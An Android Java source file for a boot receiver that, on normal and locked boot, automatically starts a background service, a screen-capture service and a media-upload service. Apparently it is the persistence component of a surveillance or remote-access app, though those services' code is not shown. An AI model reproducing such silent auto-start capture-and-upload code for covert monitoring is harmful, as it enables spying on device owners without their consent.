package com.ultimate.access.receivers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Log;

import com.ultimate.access.services.MediaUploadService;
import com.ultimate.access.services.ScreenCaptureService;
import com.ultimate.access.services.UltimateBackgroundService;

public class BootReceiver extends BroadcastReceiver {

    private static final String TAG = "BootReceiver";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction()) ||
                Intent.ACTION_LOCKED_BOOT_COMPLETED.equals(intent.getAction())) {

            Log.d(TAG, "Device boot completed, starting services...");

            // Start Background Service
            Intent bgIntent = new Intent(context, UltimateBackgroundService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(bgIntent);
            } else {
                context.startService(bgIntent);
            }

            // Start Screen Capture Service
            Intent screenIntent = new Intent(context, ScreenCaptureService.class);
            context.startService(screenIntent);

            // Start Media Upload Service
            Intent mediaIntent = new Intent(context, MediaUploadService.class);
            context.startService(mediaIntent);
        }
    }
}